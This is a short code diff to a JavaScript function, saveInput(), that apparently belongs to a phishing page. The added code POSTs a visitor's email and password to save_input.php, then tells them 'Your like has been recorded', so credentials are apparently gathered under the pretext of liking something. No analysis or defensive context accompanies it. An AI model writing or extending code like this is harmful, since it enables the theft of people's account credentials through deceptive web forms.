@@ -18,9 +18,31 @@ function saveInput() {
         return;
     }
 
-    alert("Thank you! Your like has been recorded.");
-    console.log("User Email:", email);
-    console.log("User Password:", password);
+    // Send the data to the server
+    fetch('save_input.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+            email: email,
+            password: password
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert("Thank you! Your like has been recorded.");
+        } else {
+            alert("Failed to save data: " + data.message);
+        }
+        console.log(data);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert("An error occurred while saving your data.");
+    });
+
     closeModal();
 }
 
